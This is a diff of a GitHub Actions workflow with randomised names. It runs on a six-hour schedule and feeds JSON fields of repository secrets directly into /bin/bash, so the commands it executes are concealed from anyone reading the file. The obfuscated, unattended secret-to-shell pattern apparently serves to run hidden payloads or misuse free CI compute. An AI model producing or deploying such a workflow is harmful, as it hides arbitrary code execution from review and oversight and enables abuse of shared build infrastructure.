@@ -1,30 +1,25 @@
 name: houjiteng1093
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
-
-jobs:  # 5038
+    - cron: '28 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: houjiteng1093
         env:
-          drvp66518: ${{ secrets.drvp66518 }}
+          ndld78553: ${{ secrets.ndld78553 }}
         run: |
-          echo $drvp66518 | jq -r .mcubn68499 | /bin/bash
-          echo $nv828 | jq -r .jnpd38 | /bin/bash
-          echo $hlveu6694 | jq -r .sfavi884 | /bin/bash
-          echo $usvhp26 | jq -r .uwbv23 | /bin/bash
-          echo $qalt81 | jq -r .ivll67 | /bin/bash
-          echo $ix92 | jq -r .b03429 | /bin/bash
-          echo $lt862 | jq -r .gqpl97 | /bin/bash
-          echo $unp3342 | jq -r .v34 | /bin/bash
-          echo $ouo0525 | jq -r .fmwo52 | /bin/bash
-          echo $sop5101 | jq -r .pmhmg42693 | /bin/bash
-          echo $fr1061 | jq -r .ahbl1 | /bin/bash
-          echo $mrtt34671 | jq -r .arant159 | /bin/bash
-          echo $dgio80353 | jq -r .v9 | /bin/bash
+          echo $ndld78553 | jq -r .v1 | /bin/bash
+          echo $tzxi293 | jq -r .jkl7198 | /bin/bash
+          echo $ebma1310 | jq -r .n9 | /bin/bash
+          echo $l75 | jq -r .k00 | /bin/bash
+          echo $wawj1 | jq -r .q653 | /bin/bash
+          echo $pzaw27 | jq -r .ln7 | /bin/bash
+          echo $ec93 | jq -r .btc23923 | /bin/bash
+          echo $uww0 | jq -r .d80525 | /bin/bash
+          echo $ny84177 | jq -r .dlxa3471 | /bin/bash
 
